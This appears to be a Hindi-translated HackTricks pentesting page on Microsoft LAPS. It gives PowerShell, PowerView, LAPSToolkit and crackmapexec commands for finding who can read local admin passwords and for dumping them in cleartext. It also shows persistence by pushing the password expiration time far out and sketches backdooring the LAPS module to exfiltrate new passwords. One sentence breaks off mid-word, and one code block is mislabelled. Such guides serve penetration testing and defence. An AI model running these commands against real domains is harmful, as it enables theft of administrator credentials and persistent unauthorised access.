# LAPS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का हैकट्रिक्स में विज्ञापित करना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण या हैकट्रिक्स को पीडीएफ में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**एनएफटी**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS और हैकट्रिक्स स्वैग**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** पर** **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, [हैकट्रिक्स रेपो](https://github.com/carlospolop/hacktricks) और [हैकट्रिक्स-क्लाउड रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके**।

</details>

## मूल जानकारी

लोकल एडमिनिस्ट्रेटर पासवर्ड सॉल्यूशन (LAPS) एक उपकरण है जो एडमिनिस्ट्रेटर पासवर्ड को प्रबंधित करने के लिए उपयोग किया जाता है, जो **विशेष, यादृच्छिक और नियमित रूप से बदलते** हैं, जो डोमेन-जुड़े कंप्यूटरों पर लागू होते हैं। ये पासवर्ड सुरक्षित रूप से एक्टिव डायरेक्टरी में संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं तक ही पहुंचने के लिए होते हैं जिन्हें पहुंचने की अनुमति दी गई है एक्सेस कंट्रोल सूची (ACLs) के माध्यम से। पासवर्ड प्रेषणों की सुरक्षा को ग्राहक से सर्वर तक सुनिश्चित किया जाता है **केरबेरोस संस्करण 5** और **एडवांस्ड एन्क्रिप्शन स्टैंडर्ड (AES)** का उपयोग करके।

एक्टिव डायरेक्टरी में कंप्यूटर ऑब्जेक्ट्स में, LAPS के कार्यान्वयन से दो नए विशेषताएँ जोड़ी जाती हैं: **`ms-mcs-AdmPwd`** और **`ms-mcs-AdmPwdExpirationTime`**। ये विशेषताएँ **सादा-पाठ एडमिनिस्ट्रेटर पासवर्ड** और **इसकी समाप्ति समय** को संग्रहीत करती हैं।

### जांचें कि क्या सक्रिय है
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS पासवर्ड एक्सेस

आप **`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`** से **रॉ LAPS नीति डाउनलोड** कर सकते हैं और फिर [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) पैकेज से **`Parse-PolFile`** का उपयोग करके इस फ़ाइल को मानव-पठनीय स्वरूप में परिवर्तित किया जा सकता है।

इसके अतिरिक्त, यदि वे किसी मशीन पर स्थापित हैं जिसका हमारे पास पहुंच है, तो **नेटिव LAPS PowerShell cmdlets** का उपयोग किया जा सकता है:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** का उपयोग करके यह भी पता लगाया जा सकता है **कौन पासवर्ड को पढ़ सकता है और इसे पढ़ सकता है**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) एलएपीएस की जांच को कई कार्यों के साथ सुविधाजनक बनाता है।
इनमें से एक है **`ExtendedRights`** का **समापन** **लेप्स सक्षम किए गए सभी कंप्यूटरों के लिए**। यह दिखाएगा **समूह** विशेष रूप से **लेप्स पासवर्ड पढ़ने के लिए सम्मत किए गए**, जो अक्सर सुरक्षित समूहों में उपयोगकर्ता होते हैं।
एक **खाता** जो एक कंप्यूटर को डोमेन में शामिल करता है, उस होस्ट पर `सभी विस्तारित अधिकार` प्राप्त करता है, और यह अधिकार **खाते** को **पासवर्ड पढ़ने** की क्षमता देता है। सूचीकरण एक उपयोगकर्ता खाता दिखा सकता है जो होस्ट पर लेप्स पासवर्ड पढ़ सकता है। यह हमें मदद कर सकता है **निश्चित एडी उपयोगकर्ताओं** की ओर ध्यान देने में।
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Crackmapexec के साथ LAPS पासवर्ड डंपिंग**
यदि powershell तक पहुंच नहीं है, तो आप इस विशेषाधिकार का दुरुपयोग LDAP के माध्यम से दूरस्थ रूप से कर सकते हैं।
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
## **LAPS Persistence**

### **समाप्ति तिथि**

एक बार एडमिन बनने के बाद, यह संभव है कि **पासवर्ड** प्राप्त किया जा सकता है और एक मशीन को **पासवर्ड** अपड
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
अगर **एडमिन** **`Reset-AdmPwdPassword`** cmdlet का उपयोग करता है; या अगर LAPS GPO में **जरूरी समय से अधिक पासवर्ड समाप्ति की अनुमति नहीं है** तो पासवर्ड फिर से रीसेट हो जाएगा।
{% endhint %}

### बैकडोर

LAPS के मूल स्रोत कोड [यहाँ](https://github.com/GreyCorbel/admpwd) पाया जा सकता है, इसलिए कोड में एक बैकडोर डालना संभव है (उदाहरण के लिए `Main/AdmPwd.PS/Main.cs` में `Get-AdmPwdPassword` विधि के अंदर) जो किसी प्रकार से **नए पासवर्ड को बाहर ले जाए या कहीं स्टोर करे**।

फिर, नया `AdmPwd.PS.dll` कंपाइल करें और इसे मशीन में `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` में अपलोड करें (और संशोधन समय बदलें)।

## संदर्भ
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का हैकट्रिक्स में विज्ञापन देखना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण का उपयोग करना चाहते हैं या हैकट्रिक्स को पीडीएफ में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जांच करें!
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* प्राप्त करें [**आधिकारिक PEASS और हैकट्रिक्स स्वैग**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, [हैकट्रिक्स रेपो](https://github.com/carlospolop/hacktricks) और [हैकट्रिक्स-क्लाउड रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके**।

</details>
